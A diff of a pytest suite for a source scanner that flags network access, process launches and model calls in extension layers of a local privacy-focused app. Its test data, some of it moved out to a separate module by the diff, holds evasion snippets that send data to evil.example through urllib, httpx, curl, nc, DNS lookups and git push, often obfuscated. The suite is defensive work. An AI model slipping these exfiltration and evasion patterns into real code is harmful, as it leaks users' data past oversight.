@@ -13,6 +13,7 @@ from pathlib import Path
 import pytest
 
 from understudy_engine.privacy import guard, netscan
+from understudy_engine.privacy.guard_samples import AGENT_CLEAN, CLEAN, EXTRA, REVIEWER_AGENT, REVIEWER_LAYER, ROUND2, ROUND2_CONTROL
 
 LAYER = "calendar/x.py"
 PURE = "mlv2/x.py"
@@ -25,31 +26,6 @@ def rules_of(src: str, path: str = LAYER) -> set[str]:
 
 
 # --------------------------------------------------------------------------- the reviewer's evasions: each expected rule
-REVIEWER_LAYER = {
-    "import_urllib_then_urllib_request": ("import urllib\nurllib.request.urlopen('https://evil.example/x?d=' + data)\n", {"network_import"}),
-    "from_urllib_import_request": ("from urllib import request\nrequest.urlopen('https://evil.example/x')\n", {"network_import"}),
-    "from_http_import_client": ("from http import client\nc = client.HTTPSConnection('evil.example')\nc.request('POST','/',body=data)\n", {"network_import"}),
-    "asyncio_open_connection": ("import asyncio\nasync def f(d):\n    r, w = await asyncio.open_connection('evil.example', 443)\n    w.write(d)\n", {"network_import", "network_call"}),
-    "webbrowser_open_leaks_in_url": ("import webbrowser\nwebbrowser.open('https://evil.example/?q=' + data)\n", {"network_import"}),
-    "logging_http_handler": ("import logging.handlers\nh = logging.handlers.HTTPHandler('evil.example', '/log', method='POST')\n", {"network_import"}),
-    "logging_socket_handler": ("import logging.handlers\nh = logging.handlers.SocketHandler('evil.example', 9999)\n", {"network_import"}),
-    "multiprocessing_connection": ("from multiprocessing.connection import Client\nc = Client(('evil.example', 6000))\nc.send(data)\n", {"network_import"}),
-    "curl_by_absolute_path": ("import subprocess\nsubprocess.run(['/usr/bin/curl', '-d', data, 'https://evil.example'])\n", {"process_fetcher"}),
-    "curl_string_built": ("import subprocess\nsubprocess.run('c' + 'url -d ' + data + ' https://evil.example', shell=True)\n", {"process_fetcher"}),
-    "nc_ssh_scp_osascript": ("import subprocess\nsubprocess.run(['nc', 'evil.example', '9'], input=data)\n", {"process_fetcher"}),
-    "mac_open_url": ("import subprocess\nsubprocess.run(['open', 'https://evil.example/?d=' + data])\n", {"process_url"}),
-    "python_dash_c_child": ("import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'import urllib.request as u; u.urlopen(\"https://evil.example\")'])\n", {"process_url", "network_import"}),
-    "git_push_via_subprocess": ("import subprocess\nsubprocess.run(['git', 'push', 'https://evil.example/r.git', 'HEAD'])\n", {"process_git_network", "process_url"}),
-    "getattr_on_importlib_variable_name": ("import importlib\nname = 'op' + 'enai'\nm = importlib.import_module(name)\n", {"model_client_import"}),
-    "builtin_dunder_import_alias": ("import builtins\nm = getattr(builtins, '__imp' + 'ort__')('httpx')\n", {"network_import"}),
-    "exec_string": ("exec('import ' + 'httpx; httpx.post(\"https://evil.example\", content=d)')\n", {"network_import"}),
-    "port_in_variable_named_x": ("def f(x):\n    return x.plan([{'role':'user','content':raw}], None)\n", {"model_call"}),
-    "port_via_getattr": ("def f(p):\n    return getattr(p, 'plan')([{'role':'user','content':raw}], None)\n", {"model_call"}),
-    "ctypes_libc_connect": ("import ctypes\nctypes.CDLL(None).connect\n", {"network_import"}),
-    "dns_exfil_gethostbyname": ("import socket as s\ns.gethostbyname(data + '.evil.example')\n", {"network_import", "network_call"}),
-}
-
-
 @pytest.mark.parametrize("name", sorted(REVIEWER_LAYER))
 def test_each_reviewer_evasion_is_flagged_in_an_extension_layer(name):
     src, expected = REVIEWER_LAYER[name]
@@ -61,15 +37,6 @@ def test_each_reviewer_evasion_is_flagged_in_an_extension_layer(name):
 @pytest.mark.parametrize("name", sorted(REVIEWER_LAYER))
 def test_each_reviewer_evasion_is_flagged_in_a_pure_compute_layer_too(name):
     assert rules_of(REVIEWER_LAYER[name][0], PURE), f"{name} is invisible in a pure-compute layer"
-
-
-REVIEWER_AGENT = {
-    "httpx_post_to_any_host_outside_runtime": "import httpx\nhttpx.post('https://evil.example/c', content=data)\n",
-    "requests_in_agent_voice": "import requests\nrequests.post('https://evil.example', data=data)\n",
-    "other_llm_host_not_in_PROVIDER_HOSTS": "import httpx\nhttpx.post('https://api.anthropic.com/v1/messages', json={'messages':[{'content': data}]})\n",
-    "other_llm_host_openrouter": "import httpx\nhttpx.post('https://openrouter.ai/api/v1/chat/completions', json={})\n",
-    "other_llm_host_via_env": "import os, httpx\nhttpx.post(os.environ['LLM_URL'], json={'p': data})\n",
-}
 
 
 @pytest.mark.parametrize("name", sorted(REVIEWER_AGENT))
@@ -88,104 +55,12 @@ def test_other_hosted_model_hosts_and_sdks_are_named_not_just_gemini_and_openai(
 
 
 # --------------------------------------------------------------------------- more evasions (aliases, folding, processes, dynamic code)
-EXTRA = [
-    ("import urllib.request as u\nu.urlopen('https://x')\n", "network_import"),
-    ("from socket import socket as s\ns().connect(('x', 1))\n", "network_import"),
-    ("import urllib\nu = urllib.request\nu.urlopen('https://x')\n", "network_import"),
-    ("import importlib\nu = importlib.import_module('url' + 'lib.request')\nu.urlopen('https://x')\n", "network_import"),
-    ("import importlib\nm = importlib.import_module(''.join(['soc', 'ket']))\n", "network_import"),
-    ("m = __import__('soc' + 'ket')\n", "network_import"),
-    ("import socket\nc = getattr(socket, 'create_connection')\n", "network_import"),
-    ("import importlib\nm = getattr(importlib, 'import_module')('socket')\n", "network_import"),
-    ("eval(\"__import__('socket')\")\n", "network_import"),
-    ("exec('import ' + 'smtplib')\n", "network_import"),
-    ("import os\nos.popen('wget https://x')\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.Popen(['/usr/local/bin/scp', 'a', 'h:b'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['sudo', 'curl', 'x'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['env', 'FOO=1', 'wget', 'x'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['/usr/bin/env', 'rsync', 'a', 'b'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run('sh -c \"curl x\"', shell=True)\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['sh', '-c', 'echo hi && curl x'])\n", "process_fetcher"),
-    ("import subprocess\nCURL = 'curl'\nsubprocess.run([CURL, 'x'])\n", "process_fetcher"),
-    ("import subprocess\ncmd = ['wget', 'x']\nsubprocess.run(cmd)\n", "process_fetcher"),
-    ("import subprocess\nx = 'cu'\nsubprocess.run([x + 'rl', 'u'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(f'curl {data}', shell=True)\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run('curl {}'.format(data), shell=True)\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['ssh', 'h', 'ls'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['osascript', '-e', 'do shell script \"x\"'])\n", "process_fetcher"),
-    ("import subprocess\nsubprocess.run(['git', '-C', repo, 'fetch', 'origin'])\n", "process_git_network"),
-    ("import subprocess\nsubprocess.run(['git', 'pull'])\n", "process_git_network"),
-    ("import subprocess\nsubprocess.run(['git', 'ls-remote', 'origin'])\n", "process_git_network"),
-    ("import subprocess\nsubprocess.run(['git', 'clone', 'git@host.example:r.git'])\n", "process_url"),
-    ("import subprocess\nsubprocess.run(['scp', 'f', 'user@host.example:/tmp/'])\n", "process_fetcher"),
-    ("import asyncio\nasync def f():\n    await asyncio.create_subprocess_exec('curl', 'x')\n", "process_fetcher"),
-    ("import asyncio\nasync def f(loop):\n    await loop.create_connection(P, 'h', 80)\n", "network_call"),
-    ("from asyncio import open_connection\n", "network_import"),
-    ("import asyncio.streams\n", "network_import"),
-    ("import http.server\n", "network_import"),
-    ("import socketserver\n", "network_import"),
-    ("import ssl\n", "network_import"),
-    ("import xmlrpc.client\n", "network_import"),
-    ("import smtplib\n", "network_import"),
-    ("import ftplib\n", "network_import"),
-    ("import telnetlib\n", "network_import"),
-    ("from logging.handlers import SMTPHandler\n", "network_import"),
-    ("import logging.handlers as lh\nlh.DatagramHandler('h', 1)\n", "network_import"),
-    ("import multiprocessing.managers\n", "network_import"),
-    ("import cffi\n", "network_import"),
-    ("import urllib3\n", "network_import"),
-    ("import websockets\n", "network_import"),
-    ("import paramiko\n", "network_import"),
-    ("import uvicorn\nuvicorn.run(app, host='0.0.0.0', port=1)\n", "server_not_loopback"),
-    ("import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 1))\n", "server_not_loopback"),
-    ("exec(code)\n", "dynamic_code"),
-    ("def f(src):\n    eval(src)\n", "dynamic_code"),
-    ("import importlib\nm = importlib.import_module(name)\n", "dynamic_import"),
-    ("m = __import__(name)\n", "dynamic_import"),
-    ("import subprocess\nsubprocess.run(['python3', '-c', 'import socket'])\n", "network_import"),
-    ("import subprocess\nsubprocess.run(['/usr/bin/python3.12', '-c', 'import requests'])\n", "network_import"),
-    ("from understudy_agent.models import get_model_port\n", "model_client_import"),
-    ("import openai\n", "model_client_import"),
-    ("from google import genai\n", "model_client_import"),
-    ("import google.generativeai\n", "model_client_import"),
-    ("def f(p):\n    return p.check('prompt', SCHEMA)\n", "model_call"),
-    ("def f(p):\n    return p.read(text, schema=S)\n", "model_call"),
-    ("def f(p):\n    return getattr(p, 'vision')(b'', 'x')\n", "model_call"),
-    ("def f(t):\n    return t.computer_step('g', b'', [])\n", "model_call"),
-]
-
-
 @pytest.mark.parametrize("src,rule", EXTRA, ids=[f"{i:02d}" for i in range(len(EXTRA))])
 def test_further_evasions_are_flagged(src, rule):
     assert rule in rules_of(src, LAYER), f"{src!r}: got {rules_of(src, LAYER)}"
 
 
-@pytest.mark.parametrize("src", [
-    "import json, re, ast, hashlib, math, random, itertools, dataclasses\nfrom datetime import datetime\nfrom pathlib import Path\n",
-    "from urllib.parse import urlparse, quote, parse_qs\nu = urlparse('http://x/y')\n",
-    "import urllib.parse\nurllib.parse.quote('a b')\n",
-    "import asyncio\nasync def f():\n    await asyncio.sleep(1)\n    await asyncio.gather()\n",
-    "import subprocess\nsubprocess.run(['git', '-C', repo, 'log', '--format=%H'], capture_output=True)\n",
-    "import subprocess\nsubprocess.run(['git', 'init', str(path)])\nsubprocess.run(['git', 'commit', '-m', 'x'])\n",
-    "import subprocess\nsubprocess.run(['git', 'clone', '/local/repo', '/tmp/copy'])\n",
-    "import subprocess\nsubprocess.run(['caffeinate', '-dis'])\n",
-    "import subprocess\nsubprocess.run(['screencapture', '-x', 'f.png'])\n",
-    "import subprocess, sys\nsubprocess.run([sys.executable, '-m', 'pytest'])\n",
-    "import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'print(1 + 1)'])\n",
-    "x = 'curl'\n",                                                                    # a word, in a module that starts no process
-    "NAMES = ['ssh', 'host', 'dig']\nfor n in NAMES:\n    print(n)\n",
-    "def f(items):\n    return items.read()\n",
-    "def f(plan):\n    return plan.check(1)\n",
-    "import importlib\nm = importlib.import_module('json')\n",
-    "m = __import__('os')\n",
-    "exec('x = 1 + 1')\n",
-    "import ast\ncompile(ast.parse('x=1'), 'f', 'exec')\n",
-    "from dataclasses import dataclass\nimport logging.handlers\nh = logging.handlers.RotatingFileHandler('a.log')\n",
-    "import logging.handlers\nh = logging.handlers.QueueHandler(q)\n",
-    "import multiprocessing\np = multiprocessing.Pool(2)\n",
-    "import uvicorn\nuvicorn.run(app, host='127.0.0.1', port=1)\n",
-    "import re\nPAT = re.compile(r'https?://[^ ]+')\n",
-])
+@pytest.mark.parametrize("src", CLEAN)
 def test_ordinary_code_is_not_flagged_by_the_hardened_scan(src):
     assert rules_of(src, LAYER) == set(), rules_of(src, LAYER)
 
@@ -326,3 +201,248 @@ def test_relative_imports_resolve_to_the_real_package_names():
     assert netscan.Analyzer("", "calendar/x.py", netscan.Policy(kind="layer"), None)._abs_module(2, "privacy") == "understudy_engine.privacy"
     # an extension layer importing the agent's model package through a relative path is still caught
     assert "model_client_import" in rules_of("from understudy_agent.models import get_model_port\n", "calendar/x.py")
+
+
+# --------------------------------------------------------------------------- osascript: allowed only with a constant local script, only where reviewed
+CU = "understudy_agent/tiers/computer_use.py"
+
+
+def test_osascript_is_a_fetcher_everywhere_except_one_reviewed_file_and_there_only_with_a_constant_local_script():
+    ok = "import subprocess\nsubprocess.run(['osascript', '-e', 'tell application \"TextEdit\" to get text of document 1'], capture_output=True)\n"
+    assert guard.scan_agent_source(ok, CU)[0] == []
+    assert "process_fetcher" in {v.rule for v in guard.scan_agent_source(ok, "understudy_agent/voice/x.py")[0]}                  # not reviewed there
+    for risky in ('do shell script "curl https://x"', 'tell application "Safari" to open location "https://x"', 'do shell script "id"',
+                  'tell application "Mail" to send'):
+        src = f"import subprocess\nsubprocess.run(['osascript', '-e', {risky!r}])\n"
+        assert "process_fetcher" in {v.rule for v in guard.scan_agent_source(src, CU)[0]}, risky
+    unreadable = "import subprocess\nsubprocess.run(['osascript', '-e', script])\n"
+    assert "process_fetcher" in {v.rule for v in guard.scan_agent_source(unreadable, CU)[0]}
+    assert "process_fetcher" in {v.rule for v in guard.scan_agent_source("import subprocess\nsubprocess.run(['osascript', 'file.scpt'])\n", CU)[0]}
+    assert "process_fetcher" in {v.rule for v in guard.scan_agent_source("import subprocess\nsubprocess.run(['curl', 'x'])\n", CU)[0]}     # other fetchers stay refused
+
+
+# =========================================================================== round 2 (reviewer): allowlist, browsers, processes, model references, paths
+ROUND2_EXPECT = {
+    "dnspython": {"import_not_allowed"}, "dropbox": {"network_import"}, "dynamic_attribute_call": {"model_call"}, "gcs_upload": {"import_not_allowed"},
+    "git_clone_remote_from_variable": {"process_git_unreviewed"}, "node_e_network": {"process_unreviewed"},
+    "open_file_in_synced_folder": {"home_path", "synced_folder_path"}, "paho_mqtt": {"import_not_allowed"}, "partial_of_plan": {"model_call"},
+    "perl_e": {"process_unreviewed"}, "playwright_goto_with_data": {"browser_automation"}, "posthog_telemetry": {"import_not_allowed"},
+    "python_m_module": {"process_unreviewed"}, "redis_remote": {"network_import"}, "selenium": {"browser_automation"}, "sendmail_binary": {"process_unreviewed"},
+    "sentry_sdk_ships_locals": {"import_not_allowed"}, "slack_sdk": {"network_import"}, "vars_dict_plan": {"model_call"},
+    "which_curl_not_constant": {"process_fetcher", "process_unresolved"},
+}
+
+
+@pytest.mark.parametrize("name", sorted(ROUND2))
+def test_each_round2_reviewer_evasion_is_flagged_by_the_expected_rule(name):
+    got = rules_of(ROUND2[name], LAYER)
+    assert got, f"{name} is silent"
+    assert got & ROUND2_EXPECT[name], f"{name}: flagged as {got}, expected one of {ROUND2_EXPECT[name]}"
+    assert rules_of(ROUND2[name], PURE), f"{name} is silent in a pure-compute layer"
+
+
+def test_the_round2_control_stays_clean_and_every_round2_case_has_an_expected_rule():
+    assert rules_of(ROUND2_CONTROL, LAYER) == set() and set(ROUND2) == set(ROUND2_EXPECT)
+
+
+# ---- the import allowlist
+@pytest.mark.parametrize("src", [
+    "import json, re, os, sys, math, hashlib\nfrom datetime import datetime\nfrom collections import defaultdict\n",
+    "import numpy as np\nimport pandas as pd\nimport scipy.stats\nfrom sklearn.linear_model import LogisticRegression\nimport statsmodels.api as sm\n",
+    "import lifelines, yaml, jsonschema, orjson\nfrom pydantic import BaseModel\nfrom fastapi import APIRouter\nimport threadpoolctl\n",
+    "from understudy_engine.privacy import egress\nfrom ..store import paths\nfrom . import sibling\nimport understudy_agent.security\n",
+    "import importlib\nm = importlib.import_module('numpy')\n",
+])
+def test_allowed_imports_pass_in_a_layer(src):
+    assert rules_of(src, LAYER) == set(), rules_of(src, LAYER)
+
+
+@pytest.mark.parametrize("src", ["import dns.resolver\n", "import sentry_sdk\n", "from google.cloud import storage\n", "import pyaudio\n", "import cv2\n",
+                                 "import importlib\nm = importlib.import_module('posthog')\n", "import elevenlabs\n", "import docx\n"])
+def test_other_third_party_imports_are_refused_in_a_layer_until_reviewed(src, monkeypatch):
+    assert rules_of(src, LAYER) & {"import_not_allowed", "network_import", "model_client_import"}
+    assert "import_not_allowed" in rules_of("import dns.resolver\n", LAYER)
+    monkeypatch.setitem(guard.ALLOW, "calendar/needs_docx.py", netscan.Allow("reviewed for this test", frozenset({"docx"})))
+    assert guard.scan_source("import docx\n", "calendar/needs_docx.py")[0] == []
+
+
+def test_the_agent_package_is_not_held_to_the_layer_allowlist_but_still_to_the_network_rules():
+    assert guard.scan_agent_source("import pyaudio\nimport PIL\nfrom playwright.async_api import async_playwright\nimport numpy\n", "understudy_agent/tiers/x.py")[0] == []
+    assert "network_import" in {v.rule for v in guard.scan_agent_source("import requests\n", "understudy_agent/tiers/x.py")[0]}
+
+
+@pytest.mark.parametrize("src", ["from playwright.sync_api import sync_playwright\n", "import selenium.webdriver\n", "import pyppeteer\n",
+                                 "import importlib\nimportlib.import_module('playwright.sync_api')\n"])
+def test_browser_automation_is_refused_in_a_layer(src):
+    assert "browser_automation" in rules_of(src, LAYER) and "browser_automation" in rules_of(src, PURE)
+
+
+# ---- processes: a constant program, and for git a constant read-only subcommand
+@pytest.mark.parametrize("src", [
+    "import subprocess\nsubprocess.run(['git', 'log', '--format=%H'])\n",
+    "import subprocess\nsubprocess.run(['git', '-C', repo, 'log', '-n', '5'], capture_output=True)\n",
+    "import subprocess\nsubprocess.run(['git', 'rev-parse', 'HEAD'])\n",
+    "import subprocess\nsubprocess.run(['git', 'init', str(p)])\nsubprocess.run(['git', 'commit', '-m', 'x'])\nsubprocess.run(['git', 'add', '-A'])\n",
+    "import subprocess\nsubprocess.run(['git', '--version'])\n",
+    "import subprocess\nsubprocess.run('git log --oneline', shell=True)\n",
+])
+def test_git_with_a_constant_read_only_subcommand_is_fine_in_a_layer(src):
+    assert rules_of(src, LAYER) == set(), rules_of(src, LAYER)
+
+
+@pytest.mark.parametrize("src,rule", [
+    ("import subprocess\nsubprocess.run(['git', 'clone', remote, '/tmp/x'])\n", "process_git_unreviewed"),
+    ("import subprocess\nsubprocess.run(['git', 'clone', '/local/repo', '/tmp/x'])\n", "process_git_unreviewed"),
+    ("import subprocess\nsubprocess.run(['git', 'push'])\n", "process_git_network"),
+    ("import subprocess\nsubprocess.run(['git', sub, 'x'])\n", "process_git_unreviewed"),
+    ("import subprocess\nsubprocess.run(['git'])\n", "process_git_unreviewed"),
+    ("import subprocess\nsubprocess.run(['node', '-e', 'x'])\n", "process_unreviewed"),
+    ("import subprocess\nsubprocess.run(['ls', '-l'])\n", "process_unreviewed"),
+    ("import subprocess, sys\nsubprocess.run([sys.executable, '-m', 'pip', 'list'])\n", "process_unreviewed"),
+    ("import subprocess\nsubprocess.run(cmd)\n", "process_unresolved"),
+    ("import subprocess\nsubprocess.run(build_argv(x))\n", "process_unresolved"),
+    ("import subprocess\nsubprocess.Popen([program, '-v'])\n", "process_unresolved"),
+    ("import os\nos.system('ls')\n", "process_unreviewed"),
+])
+def test_anything_else_a_layer_starts_is_refused_until_reviewed(src, rule):
+    assert rule in rules_of(src, LAYER), (src, rules_of(src, LAYER))
+
+
+def test_a_reviewed_entry_may_name_the_other_programs_or_say_the_argv_is_built_elsewhere(monkeypatch):
+    monkeypatch.setitem(guard.ALLOW, "calendar/runner.py", netscan.Allow("test", processes=frozenset({"ps"}), dynamic_process=True))
+    assert guard.scan_source("import subprocess\nsubprocess.run(['ps', '-o', 'command=', '-p', '1'])\nsubprocess.run(cmd)\n", "calendar/runner.py")[0] == []
+    monkeypatch.setitem(guard.ALLOW, "calendar/ps_only.py", netscan.Allow("test", processes=frozenset({"ps"})))
+    assert guard.scan_source("import subprocess\nsubprocess.run(['ps', 'x'])\n", "calendar/ps_only.py")[0] == []
+    assert "process_unresolved" in {v.rule for v in guard.scan_source("import subprocess\nsubprocess.run(cmd)\n", "calendar/ps_only.py")[0]}
+    assert "process_unreviewed" in {v.rule for v in guard.scan_source("import subprocess\nsubprocess.run(['ls'])\n", "calendar/ps_only.py")[0]}
+    # a reviewed entry never makes a fetcher acceptable
+    assert "process_fetcher" in {v.rule for v in guard.scan_source("import subprocess\nsubprocess.run(['curl', 'x'])\n", "calendar/runner.py")[0]}
+
+
+def test_the_agent_package_may_run_other_programs_without_review_but_not_fetchers():
+    assert guard.scan_agent_source("import subprocess\nsubprocess.run(['screencapture', '-x', 'f.png'])\nsubprocess.run(cmd)\n", "understudy_agent/tiers/x.py")[0] == []
+    assert "process_fetcher" in {v.rule for v in guard.scan_agent_source("import subprocess\nsubprocess.run(['wget', 'x'])\n", "understudy_agent/tiers/x.py")[0]}
+
+
+def test_the_git_commands_the_git_layer_runs_start_with_git_log():
+    from understudy_engine.gitanalysis import source
+
+    argv = source.git_argv(Path("/tmp/repo"), "log", "-n", "1")
+    assert argv[0] == "git" and "log" in argv
+    src = Path(source.__file__).read_text()
+    assert "git_argv(self.repo, *args)" in src and 'args = ["log"' in src
+
+
+# ---- model methods reached without a plain call, and the false-positive controls for ordinary `plan` attributes
+@pytest.mark.parametrize("src", [
+    "import functools\nf = functools.partial(port.plan, msgs)\n",
+    "from functools import partial\nf = partial(x.plan, msgs)\n",
+    "import functools\nf = functools.partial(thing.vision, img)\n",
+    "import threading\nthreading.Thread(target=x.plan, args=(m,)).start()\n",
+    "def f(ex, port):\n    return ex.submit(port.plan, msgs)\n",
+    "import asyncio\nasync def f(port):\n    return await asyncio.to_thread(port.plan, msgs)\n",
+    "p = port.plan\n",
+    "g = self.model.check\n",
+    "import operator\nf = operator.attrgetter('plan')\n",
+    "import operator\nf = operator.methodcaller('vision', img)\n",
+    "f = getattr(x, 'plan')\n",
+    "f = getattr(x, 'comp' + 'uter_step')\n",
+    "def f(c):\n    return vars(c)['plan']\n",
+    "def f(c):\n    return c.__dict__['vision']\n",
+    "def f(c):\n    return type(c).__dict__['plan'](c, m)\n",
+])
+def test_a_reference_to_a_model_method_is_refused_without_a_call(src):
+    assert "model_call" in rules_of(src, LAYER), (src, rules_of(src, LAYER))
+
+
+@pytest.mark.parametrize("src", [
+    "def f(ctx):\n    return ctx.plan.strategy\n",
+    "def f(sx):\n    x = sx.plan\n    return emit(sx, sx.plan, 1)\n",
+    "class A:\n    def __init__(self, plan):\n        self.plan = plan\n",
+    "def f(row):\n    return row['plan']\n",
+    "d = {'plan': 1}\nx = d['plan']\n",
+    "def f(ctx):\n    for s in ctx.plan.stuck:\n        print(s)\n",
+    "import functools\nf = functools.partial(print, 'plan')\n",
+    "def f(o):\n    return getattr(o, 'name')\n",
+    "def f(items):\n    return vars(items)['count']\n",
+    "def f(plan):\n    return plan.steps\n",
+])
+def test_ordinary_plan_attributes_and_dictionary_keys_are_not_flagged(src):
+    assert rules_of(src, LAYER) == set(), (src, rules_of(src, LAYER))
+
+
+# ---- paths: no home folder, no synced folder
+@pytest.mark.parametrize("src", [
+    "from pathlib import Path\np = Path.home() / 'x'\n",
+    "import pathlib\np = pathlib.Path.home()\n",
+    "import os\np = os.path.expanduser('~/Documents')\n",
+    "from pathlib import Path\np = Path('~/notes').expanduser()\n",
+    "import os\nh = os.getenv('HOME')\n",
+    "import os\nh = os.environ.get('HOME')\n",
+])
+def test_a_layer_may_not_reach_into_the_home_folder(src):
+    assert "home_path" in rules_of(src, LAYER)
+
+
+@pytest.mark.parametrize("path", ["~/Library/Mobile Documents/com~apple~CloudDocs/x", "/Users/a/Dropbox/x", "/Users/a/OneDrive - Corp/x", "/Users/a/Google Drive/x",
+                                  "/Users/a/Library/CloudStorage/Box-Box/x", "/Volumes/Backup/x", "/Users/a/iCloud Drive/x"])
+def test_a_layer_may_not_name_a_synced_folder(path):
+    assert "synced_folder_path" in rules_of(f"P = {path!r}\n", LAYER)
+
+
+def test_paths_under_the_data_directory_and_env_based_roots_are_fine():
+    assert rules_of("import os\nfrom pathlib import Path\nroot = Path(os.environ.get('UNDERSTUDY_DATA_DIR', 'data')) / 'x'\nroot.mkdir(parents=True)\n", LAYER) == set()
+    assert rules_of("from pathlib import Path\np = Path(env).expanduser()\n", LAYER) == set()
+
+
+def test_only_two_reviewed_files_may_use_home_and_they_really_default_to_the_understudy_folder(monkeypatch):
+    homes = sorted(k for k, a in guard.ALLOW.items() if a.home_path)
+    assert homes == ["cue/paths.py", "proactive/paths.py"]
+    monkeypatch.delenv("UNDERSTUDY_HOME", raising=False)
+    from understudy_engine.proactive import paths as pp
+
+    assert pp.home_dir() == Path.home() / ".understudy"
+    try:
+        from understudy_engine.cue import paths as cp
+    except ImportError:
+        return
+    assert cp.home_dir() == Path.home() / ".understudy"
+
+
+# ---- the pure packages: attention (engine) and context (agent)
+def test_attention_and_context_are_flagged_layers_and_pure_compute():
+    from understudy_engine.privacy import flags
+
+    assert {"attention", "context"} <= set(flags.LAYERS) and "attention" in guard.GUARDED_DIRS and "attention" in guard.PURE_COMPUTE_DIRS
+    assert "understudy_agent/context/" in guard.AGENT_PURE_PREFIXES
+    assert rules_of("import subprocess\n", "attention/x.py") and rules_of("import requests\n", "attention/x.py")
+    assert rules_of("import numpy as np\nfrom fastapi import APIRouter\nrouter = APIRouter()\n", "attention/routes.py") == set()
+
+
+@pytest.mark.parametrize("src,rule", [
+    ("import subprocess\n", "pure_compute_import"), ("import requests\n", "network_import"), ("from understudy_agent.models import get_model_port\n", "model_client_import"),
+    ("import openai\n", "model_client_import"), ("U = 'https://example.org/x'\n", "pure_compute_url"), ("import os\nos.system('ls')\n", "pure_compute_call"),
+    ("import pyaudio\n", "import_not_allowed"), ("def f(port):\n    return port.plan([], None)\n", "model_call"),
+])
+def test_the_agent_context_package_is_pure_compute_with_no_exceptions(src, rule, monkeypatch):
+    path = "understudy_agent/context/assemble.py"
+    monkeypatch.setitem(guard.AGENT_ALLOW, path, netscan.Allow("a mistaken entry", frozenset({"requests", "httpx", "socket"}), dynamic_process=True))
+    assert rule in {v.rule for v in guard.scan_agent_source(src, path)[0]}, guard.scan_agent_source(src, path)[0]
+
+
+def test_agent_context_may_import_numbers_json_and_its_own_package():
+    ok = "import json, re\nimport numpy as np\nfrom pydantic import BaseModel\nfrom ..security import paths\nfrom understudy_agent.audit import AuditLog\n"
+    assert guard.scan_agent_source(ok, "understudy_agent/context/assemble.py")[0] == []
+
+
+def test_programs_and_servers_that_are_ordinary_for_the_agent_are_refused_in_a_layer_and_clean_in_the_agent_package():
+    assert len(AGENT_CLEAN) == 5
+    for src in AGENT_CLEAN:
+        assert guard.scan_agent_source(src, "understudy_agent/tiers/x.py")[0] == [], src
+        assert rules_of(src, LAYER) & {"process_unreviewed", "process_unresolved", "import_not_allowed"}, src
+
+
+def test_pillow_is_allowed_only_as_pure_image_decoding_and_still_cannot_bring_the_network_with_it():
+    assert rules_of("from PIL import Image\nim = Image.open(buf).resize((64, 64))\n", LAYER) == set()
+    assert rules_of("from PIL import Image\nimport socket\n", LAYER) == {"network_import"}
+    assert guard.scan_agent_source("from PIL import Image\nimport numpy as np\n", "understudy_agent/context/frames.py")[0] == []
